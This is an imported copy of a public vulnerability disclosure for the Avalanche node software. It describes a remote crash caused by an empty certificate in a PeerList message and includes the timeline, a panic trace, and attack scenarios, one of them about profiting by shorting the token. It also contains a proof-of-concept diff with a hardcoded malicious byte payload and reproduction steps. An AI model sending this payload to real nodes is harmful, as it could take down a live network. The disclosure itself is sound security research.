---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-08_avalanche-remote-network-crash.md
original_filename: 2022-09-08_avalanche-remote-network-crash.md
title: Avalanche remote network crash
category: documents
detected_topics:
- supply-chain
- command-injection
- rate-limit
- api-security
tags:
- imported
- documents
- supply-chain
- command-injection
- rate-limit
- api-security
language: en
raw_sha256: f20ba8f6bef5f0f5485d6efe6c6b6ddd57ce2dc5d61bf95956900848a4ab863b
text_sha256: fe442bdd8cae40de091e6f2651b114eb99e519ff1dac148005920b48807f0612
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: false
---

# Avalanche remote network crash

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-08_avalanche-remote-network-crash.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection, rate-limit, api-security
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: False
- Raw SHA256: `f20ba8f6bef5f0f5485d6efe6c6b6ddd57ce2dc5d61bf95956900848a4ab863b`
- Text SHA256: `fe442bdd8cae40de091e6f2651b114eb99e519ff1dac148005920b48807f0612`


## Content

---
title: "Avalanche remote network crash"
page_title: "Avalanche remote network crash · GitHub"
url: "https://gist.github.com/karalabe/4d10a879e361bb5b85302d57c193f532"
final_url: "https://gist.github.com/karalabe/4d10a879e361bb5b85302d57c193f532"
authors: ["Pter Szilgyi (@peter_szilagyi)"]
programs: ["Ava Labs"]
bugs: ["DoS"]
publication_date: "2022-09-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2187
---

The report below is a remote DoS vector that could have been used to take down the entire Avalanche network.

Timeline:

  * 29th March, 2022: the vulnerability was found by Péter Szilágyi.
  * 29th March, 2022: the vulnerability was [patched](https://github.com/ava-labs/avalanchego/commit/5c1fcb3b0acf0e033ed4b0c231801c7a670fc9a4#diff-cb47dbaf6295f5e68096f6888973c293ad592f5e6ba03a644b206a09f28fd636L526) via Peter's suggestion.
  * 30th March, 2022: the fix was released as part of `avalanchego` v1.7.9.
  * 6th September, 2022: the embargo ended with the Apricot Phase 6 hard fork.
  * 8th September, 2022: the vulnerability was made public with Patrick's permission.

Below you can find the original submitted vulnerability report.

* * *

## Remote node crash via malicious PeerList package

The network communication (via package `message`) uses the type serializers from `utils/wrappers` to pack and unpack messages. These in theory should ensure that no invalid data gets accepted over the wire, but unfortunately falls short at least in one case, namely [unpacking a x509 certificate](https://github.com/ava-labs/avalanchego/blob/master/utils/wrappers/packing.go#L524).
  
  
  func (p *Packer) UnpackX509Certificate() *x509.Certificate {
  b := p.UnpackBytes()
  if len(b) == 0 {
  return nil
  }
  cert, err := x509.ParseCertificate(b)
  if err != nil {
  p.Add(err)
  return nil
  }
  return cert
  }

Specifically, the first check that checks for the length of the encoded certificate will accept and return `nil` for an empty cert, instead of rejecting it. I'd imagine the fix is simply adding a `p.Add(errBadLength)` or similar check. Alternatively, perhaps this check can even be dropped and let `x509.ParseCertificate` choke on it?

### Why is this an issue?

After decoding a `PeerList` packet - part of a remote handshake with an arbitrary untrusted node - the local node will iterate through all the peer certs announced in the handshake and will attempt to [convert them to a node ID](https://github.com/ava-labs/avalanchego/blob/master/network/network.go#L367), which will [access the internals](https://github.com/ava-labs/avalanchego/blob/061dc80fb8aee549a229e153f1dcad9d24aa4b86/network/peer/upgrader.go#L71) of the `nil` cert and blow up.
  
  
  [node-0] panic: runtime error: invalid memory address or nil pointer dereference
  [node-0] [signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0xaf46b8]
  [node-0]
  [node-0] goroutine 49 [running]:
  [node-0] github.com/ava-labs/avalanchego/network/peer.CertToID(0x734f09e9000c60f0?)
  [node-0] 	/work/src/github.com/ava-labs/avalanchego/network/peer/upgrader.go:71 +0x38
  [node-0] github.com/ava-labs/avalanchego/network.(*network).Track(0xc0006a2200, {0x0, {{0xc0008f85da, 0x10, 0x1f}, 0x3030}, 0x3030303030303030, {0xc0008f85f8, 0x1, 0x1}})
  [node-0] 	/work/src/github.com/ava-labs/avalanchego/network/network.go:367 +0x55
  [node-0] github.com/ava-labs/avalanchego/network/peer.(*peer).handlePeerList(0xc0010284b0, {0x19ecf90?, 0xc0000a9090?})
  [node-0] 	/work/src/github.com/ava-labs/avalanchego/network/peer/peer.go:836 +0x1d5
  [node-0] github.com/ava-labs/avalanchego/network/peer.(*peer).handle(0xc0010284b0, {0x19ecf90, 0xc0000a9090})
  [node-0] 	/work/src/github.com/ava-labs/avalanchego/network/peer/peer.go:649 +0x20b
  [node-0] github.com/ava-labs/avalanchego/network/peer.(*peer).readMessages(0xc0010284b0)
  [node-0] 	/work/src/github.com/ava-labs/avalanchego/network/peer/peer.go:465 +0x651
  [node-0] created by github.com/ava-labs/avalanchego/network/peer.Start
  [node-0] 	/work/src/github.com/ava-labs/avalanchego/network/peer/peer.go:196 +0x3ea
  

### How can this be abused?

Avalanche is very relaxed on the network connections it makes, and even a single connection is enough to take down a node. Depending on how much effort an attacker wants to put into it, they have two choices:

  * Run a _non-validator_ node that feeds malicious packets to peers it connects to. This is trivial, but the attack would take a bit longer to fully form: nodes would start iteratively dropping offline instead of all at once. But since dead nodes would free up slots / resources on the remainder of live nodes, it would open up the capacity to attach and attack the ones standing too. Eventually you end up with all nodes dead (or restarting if they're behind some service daemon, but only to crash again).
  * Register a new validator and start it up with a malicious packet injection attack. Since all nodes in the network connect to all validators, it's pretty much an insta-death for the entire network. The price is of course 2000AVAX, but I kind of find that acceptable since a nice short would net a sweet profit and the network would rebound anyway after a few hours so no long term value lost in the malicious validator.

### Show me the code

Since I don't have a good control over the codebase to create a very siloed off repro and report, I modified my own local Avalanche codebase and ran it against itself (PVP!) via a local network.

The first step is to inject the attack payload when creating a PeerList packet. I went with the dumb and effective approach, just crash anyone on the other side.
  
  
  diff --git a/message/outbound_msg_builder.go b/message/outbound_msg_builder.go
  index aad96c33c..28e0c1b56 100644
  --- a/message/outbound_msg_builder.go
  +++ b/message/outbound_msg_builder.go
  @@ -171,14 +171,13 @@ func (b *outMsgBuilder) Version(
  }
  
  func (b *outMsgBuilder) PeerList(peers []utils.IPCertDesc, bypassThrottling bool) (OutboundMessage, error) {
  -  return b.c.Pack(
  -  PeerList,
  -  map[Field]interface{}{
  -  SignedPeers: peers,
  -  },
  -  b.compress && PeerList.Compressible(), // PeerList messages may be compressed
  -  bypassThrottling,
  -  )
  +  return &outboundMessage{
  +  op:  PeerList,
  +  bytes:  []byte("\x12\x00\x00\x00\x00\x01\x00\x00\x00\x0000000000000000000000000000\x00\x00\x00\x010"),
  +  refs:  1,
  +  c:  b.c.(*codec),
  +  bypassThrottling: bypassThrottling,
  +  }, nil
  }

Obviously build via `./scripts/build.sh` or whatever you use.

The second thing is to run these malicious nodes head-to-head against each other. For that I used Avalanche's [local test network tool](https://github.com/ava-labs/avalanche-network-runner). This tool by default does not log `stdout` and `stderr` data from the internal Avalanche nodes it runs (and I've no idea yet how to configure it to do so), so I just tweaked it's code to always print out the contents of `stderr` to see any panics happening.
  
  
  diff --git a/local/network.go b/local/network.go
  index 8fb6e91..0024333 100644
  --- a/local/network.go
  +++ b/local/network.go
  @@ -174,14 +174,13 @@ func (npc *nodeProcessCreator) NewNodeProcess(config node.Config, args ...string
  // redirect stdout and assign a color to the text
  utils.ColorAndPrepend(stdout, npc.stdout, config.Name, color)
  }
  -  if localNodeConfig.RedirectStderr {
  -  stderr, err := cmd.StderrPipe()
  -  if err != nil {
  -  return nil, fmt.Errorf("Could not create stderr pipe: %s", err)
  -  }
  -  // redirect stderr and assign a color to the text
  -  utils.ColorAndPrepend(stderr, npc.stderr, config.Name, color)
  +  stderr, err := cmd.StderrPipe()
  +  if err != nil {
  +  return nil, fmt.Errorf("Could not create stderr pipe: %s", err)
  }
  +  // redirect stderr and assign a color to the text
  +  utils.ColorAndPrepend(stderr, npc.stderr, config.Name, color)
  +
  return &nodeProcessImpl{cmd: cmd}, nil
  }

Finally, deploy an example network and see them fight to the end! You may need to set GOPATH before the command since I have multiple paths in there and the tool seems to choke on it.
  
  
  $ go run examples/local/indepth/main.go
  
  [... boring logs... ]
  
  BOOM
  

[![](https://user-images.githubusercontent.com/129561/189102293-ae9831ee-210f-4fd9-8c08-08cf25228208.png)](https://user-images.githubusercontent.com/129561/189102293-ae9831ee-210f-4fd9-8c08-08cf25228208.png)

Njoy :P
